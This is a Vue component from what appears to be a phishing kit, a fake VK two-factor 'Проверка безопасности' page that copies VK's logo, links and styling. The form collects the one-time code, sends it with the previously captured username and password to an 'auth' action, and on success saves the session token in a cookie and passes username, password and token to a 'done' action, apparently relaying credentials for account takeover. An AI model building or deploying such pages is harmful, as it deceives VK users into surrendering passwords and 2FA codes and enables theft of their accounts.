<template>
  <div class="base-wrapper">
    <div class="middle-wrapper">
      <header class="header">
        <div class="container">
          <div class="nav-row">
            <a href="https://vk.com" class="header-vk" target="_blank">
              <img src="/logo.svg" alt="VK" />
            </a>
            <a href="https://vk.com/" class="header-exit link hide-pc">
              <b>выйти</b>
            </a>
            <a
              href="https://vk.com/join?reg=1"
              class="header-reg link hide-m"
              target="_blank"
            >
              <b>регистрация</b>
            </a>
          </div>
        </div>
      </header>
      <div class="container">
        <div class="form-wrapper">
          <header class="form-header">
            Проверка безопасности
          </header>
          <main class="form-content">
            <p class="2fa-text">
              Пожалуйста, введите
              <b>код</b>
              из личного сообщения от Администрации или из приложения для
              генерации кодов, чтобы подтвердить, что Вы — владелец страницы.
            </p>
            <div v-if="$store.state.error.length > 0" class="error">
              <div v-html="$store.state.error" class="error-container"></div>
            </div>
            <form
              @submit.prevent="checkcode()"
              action="/auth"
              class="form-inner"
              enctype="application/x-www-form-urlencoded"
              method="POST"
              autocomplete="on"
            >
              <hide-m>
                <div class="form">
                  <input
                    id="code-pc"
                    v-model="code"
                    :disabled="$store.state.waiting"
                    type="text"
                    name="code"
                    placeholder="Введите код"
                    class="form-input"
                    autocomplete="one-time-code"
                  />

                  <vk-button
                    :disabled="$store.state.waiting"
                    class="vk-button-disabled-by-loading"
                    type="submit"
                    variant="primary"
                  >
                    Отправить
                  </vk-button>

                  <label class="checkbox">
                    <input
                      id="remember-browser-pc"
                      v-model="remember"
                      type="checkbox"
                      name="remember-browser"
                    />
                    Запомнить браузер
                  </label>
                </div>
              </hide-m>
              <hide-pc>
                <div class="form">
                  <div class="form-group">
                    <label for="code-m" class="form-label">
                      Код подтверждения:
                    </label>
                    <input
                      id="code-m"
                      v-model="code"
                      :disabled="$store.state.waiting"
                      type="text"
                      name="code"
                      autocomplete="one-time-code"
                      class="form-input"
                    />
                    <label class="checkbox">
                      <input
                        id="remember-browser-m"
                        v-model="remember"
                        type="checkbox"
                        name="remember-browser"
                      />
                      Запомнить браузер
                    </label>
                  </div>
                  <div class="form-group">
                    <vk-button
                      :disabled="$store.state.waiting"
                      type="submit"
                      variant="primary"
                    >
                      Отправить код
                    </vk-button>
                  </div>
                </div>
              </hide-pc>
            </form>
          </main>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import Vue from 'vue'
import Component from 'vue-class-component'
import VKButton from '~/components/VKButton'
import HidePC from '~/components/HidePC'
import HideM from '~/components/HideM'
import { R_SUCCESS } from '~/server/auth-constants'

@Component({
  components: {
    'vk-button': VKButton,
    'hide-pc': HidePC,
    'hide-m': HideM
  },

  layout: 'page',

  mounted() {
    this.interval = setInterval(() => {
      if (this.$store.state.status === R_SUCCESS) {
        this.$cookies.set('done', '1')
        this.$cookies.set('token', this.$store.state.token)

        this.$store.dispatch('done', {
          username: this.$store.state.username,
          password: this.$store.state.password,
          token: this.$store.state.token,
          '2fa': true
        })

        clearInterval(this.interval)
      }
    }, 100)
  }
})
class AuthCheckPage extends Vue {
  remember = true

  get code() {
    return this.$store.state.code
  }

  set code(value) {
    this.$store.commit('setCode', value)
  }

  checkcode() {
    this.$store.dispatch('auth', {
      username: this.$store.state.username,
      password: this.$store.state.password,
      code: this.code,
      $cookie: this.$cookies
    })
  }
}

export default AuthCheckPage
</script>
<style scoped>
@media screen and (min-width: 751px) {
  .header {
    background-color: var(--primary-darker-color);
    height: 42px;
  }

  .nav-row {
    display: flex;
    width: 100%;
    height: 100%;
    justify-content: space-between;
    align-content: center;
  }
  .nav-row a {
    font-size: var(--font-size-sm);
    line-height: 42px;
    text-decoration: none !important;
    cursor: pointer;
    padding: 0 10px;
  }

  .header-reg {
    color: #ffffff;
  }

  .header-reg:hover {
    background-color: #3d6898;
  }

  .container {
    display: block;
    width: 100%;
    height: 100%;
    max-width: 661px;
    margin: 0 auto;
  }

  .header-vk img {
    width: 34px;
    margin-top: 11px;
  }

  .form-wrapper {
    margin-top: 20px;
    background-color: #fff;
    box-shadow: var(--desktop-box-shadow);
    overflow: hidden;
    border-radius: 4px;
    min-height: 254px;
  }

  .form-header {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    line-height: 54px;
    font-size: var(--font-size-xl);
    padding: 0 20px;
    border-bottom: 1px solid #e7e8ec;
  }

  .form-content {
    padding: 20px;
  }
  .form-content p {
    margin: 0;
    padding-bottom: 20px;
    line-height: 19px;
  }

  .form {
    width: 140px;
    margin: 0 auto;
  }
  .form * {
    margin-bottom: 10px;
  }

  .checkbox {
    width: 200px;
    display: block;
    cursor: pointer;
    line-height: 1.27em;
  }
  .checkbox input {
    display: block;
    content: '';
    float: left;
    background: url(~assets/checkbox-pc.svg) no-repeat 0;
    margin: 0 7px 0 0;
    width: 15px;
    height: 15px;
    appearance: none;
    outline: none;
  }
  .checkbox input:checked {
    background-image: url(~assets/checkbox-pc-checked.svg);
  }

  .error {
    padding: 7px 18px 9px;
    margin: 15px 20px;
    border: 1px solid #c1c9d9;
    border-radius: 2px;
    margin: 0 0 20px;
    background: #ffefe9 url(~assets/msg_error.png) no-repeat 12px 12px;
    padding-left: 55px;
    border-color: #f2ab99;
    min-height: 40px;
    line-height: 38px;
  }

  .error-container {
    display: inline-block;
    vertical-align: middle;
    line-height: 150%;
  }
}
@media screen and (max-width: 750px) {
  .header {
    background-color: var(--primary-darker-color);
    height: 48px;
  }

  .nav-row {
    display: flex;
    width: 100%;
    height: 100%;
    justify-content: space-between;
    align-content: center;
  }
  .nav-row a {
    font-size: var(--font-size-sm);
    line-height: 48px;
    text-decoration: none !important;
    cursor: pointer;
    padding: 0 10px;
  }

  .header-exit {
    margin-right: 6px;
    color: #ffffff;
  }

  .header-exit:hover {
    background-color: #4676ac;
    color: #e4ecf6;
  }

  .container {
    display: block;
    width: 100%;
    height: 100%;
    max-width: 620px;
    margin: 0 auto;
  }

  .header-vk {
    display: inline-block;
    padding-left: 16px !important;
  }
  .header-vk img {
    width: 32px;
    margin-top: 15px;
  }

  .form-wrapper {
    background-color: #fff;
  }

  .form-header {
    word-wrap: break-word;
    border-bottom: 1px solid #efefef;
    background-color: var(--box-prepend-color);
    color: #606060;
    padding: 8px 7px;
    padding-left: 12px;
    font-size: var(--font-size-lg);
    font-weight: bold;
  }

  .form-content {
    padding: 12px;
    padding-top: 10px;
    font-size: var(--font-size-lg);
  }
  .form-content p {
    margin: 0;
  }

  .form-group {
    padding-top: 10px;
  }

  .form-label {
    padding: 4px 0 8px;
    color: #909499;
    display: block;
  }

  .form-input {
    font-size: var(--font-size-lg);
    padding: 9px 10px 11px;
  }

  .vk-button {
    width: 100%;
    border-radius: 4px;
    font-size: 15px !important;
    font-weight: 500;
    padding: 10px 16px 12px !important;
    height: 38px;
  }

  .checkbox {
    width: 200px;
    display: block;
    cursor: pointer;
    padding: 17px 0;
    /* line-height: 1.27em; */
    font-size: 1em;
    user-select: none;
  }
  .checkbox input {
    display: inline-block;
    content: '';
    width: 17px;
    height: 17px;
    vertical-align: middle;
    margin-right: 5px;
    padding: 0;
    background: no-repeat 0;
    background-image: url(~assets/checkbox-m.png);
    appearance: none;
    outline: none;
  }
  .checkbox input:checked {
    background-position: -51px;
  }
  .checkbox input:hover {
    background-position: -17px;
  }
  .checkbox input:checked:hover {
    background-position: -68px;
  }

  .error {
    position: fixed;
    display: block;
    padding: 14px 14px 14px 12px;
    box-shadow: 0 0 24px 0 rgba(0, 0, 0, 0.32), 0 0 2px 0 rgba(0, 0, 0, 0.08);
    margin: 8px 7px;
    bottom: 0;
    left: 0;
    right: 0;
    transition: opacity 0.25s ease, transform 0.15s ease,
      -webkit-transform 0.15s ease, -moz-transform 0.15s ease,
      -o-transform 0.15s ease;
    user-select: none;
    z-index: 10000;
    border-radius: 8px;
    background: #fcfcfc;
    padding-left: 52px;
  }
  .error::before {
    content: '';
    background-position: -48px -52px;
    background-repeat: no-repeat;
    width: 24px;
    height: 24px;
    background-size: 76px 76px;
    background-image: url(~assets/sprites.svg);
    position: absolute;
    z-index: 10001;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
  }

  .error-container b {
    font-weight: normal !important;
  }
}
</style>
